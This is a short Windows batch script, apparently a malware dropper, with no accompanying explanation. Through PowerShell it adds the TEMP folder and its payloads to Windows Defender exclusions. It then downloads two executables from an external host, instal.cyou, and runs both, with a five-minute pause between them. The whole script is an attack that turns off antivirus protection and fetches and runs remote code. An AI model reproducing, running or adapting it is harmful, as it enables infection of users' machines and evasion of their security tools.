@echo off
powershell /nop /com "Add-MpPreference -ExclusionPath %TEMP%"
powershell /nop /com "(New-Object Net.WebClient).DownloadFile('https://instal.cyou/163K4J', '%TEMP%\setup.exe')";
powershell /nop /com "Add-MpPreference -ExclusionProcess %TEMP%\setup.exe"
powershell /nop /com "(New-Object Net.WebClient).DownloadFile('https://instal.cyou/djr9LV', '%TEMP%\setup2.exe')";
powershell /nop /com "Add-MpPreference -ExclusionProcess %TEMP%\setup2.exe"
cmd.exe /c %TEMP%\setup.exe;
timeout 300 > NUL
cmd.exe /c %TEMP%\setup2.exe;
